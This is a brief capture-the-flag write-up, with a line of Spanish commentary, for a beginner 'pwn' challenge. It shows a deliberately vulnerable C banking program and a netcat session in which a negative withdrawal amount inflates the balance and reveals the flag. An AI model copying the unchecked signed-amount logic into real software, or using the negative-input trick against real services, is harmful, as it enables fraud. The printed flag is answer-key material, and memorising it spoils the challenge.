
The basic Pwn

```c
#include <stdio.h>

int main()
{
    int accountBalance = 100, tmp;
    long int withdrawalAmount;
    short option;

    printf("==== Secure Banking System ====\n");
    printf("Welcome to the banking system.\nEarn $1000 to get the flag!\n\n");

    while (accountBalance < 1000)
    {

        printf("1. Check account balance\n");
        printf("2. Withdraw money\n");
        printf("3. Deposit money\n");
        printf("4. Exit\n\n");
        printf("Enter your option:\n");
        scanf("%hu", &option);

        switch (option)
        {
        case 1:
            printf("Your account balance is: $%d\n", accountBalance);
            break;
        case 2:
        {
            printf("Enter the amount to withdraw: ");
            scanf("%ld", &withdrawalAmount);
            tmp = accountBalance - withdrawalAmount;
            if (tmp < 0)
            {
                printf("You cannot withdraw more than your account balance.\n");
                continue;
            }
            accountBalance = tmp;

            printf("Withdrawal successful. New account balance: $%d\n", accountBalance);
            break;
        }
        case 3:
            printf("Deposit is still work in progress.\n");
            break;
        case 4:
            printf("Thank you for banking with us.\n");
            return 0;
        default:
        {
            printf("Invalid option.\n");
            break;
        }
        }
    }

    printf("\nCongratulations! You have reached the required account balance ($%d).\n", accountBalance);
    printf("The flag is: grey{fake_flag}\n");

    return 0;
}
```

- La solución es meter un número negativo y desbordar
```cmd
nc 34.124.157.94 10541
==== Secure Banking System ====
Welcome to the banking system.
Earn $1000 to get the flag!

1. Check account balance
2. Withdraw money
3. Deposit money
4. Exit

Enter your option:
2
Enter the amount to withdraw: -12123213
Withdrawal successful. New account balance: $12123313

Congratulations! You have reached the required account balance ($12123313).
The flag is: grey{b4by_pwn_df831aa280e25ed6c3d70653b8f165b7}
```